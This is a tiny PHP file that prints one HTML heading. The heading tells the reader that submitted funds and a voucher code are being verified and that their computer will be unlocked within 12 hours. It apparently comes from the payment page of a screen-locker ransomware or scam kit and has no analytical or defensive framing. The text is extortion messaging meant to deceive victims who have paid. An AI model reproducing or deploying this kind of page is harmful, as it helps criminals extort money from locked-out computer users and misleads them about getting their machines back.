<?php

echo '<center><h1>These funds have been submited for verification. We must first verify validity of the vouchers code. Upon succesfull your 
computer will be unlock within 12 hours.</h1></center>';

?>
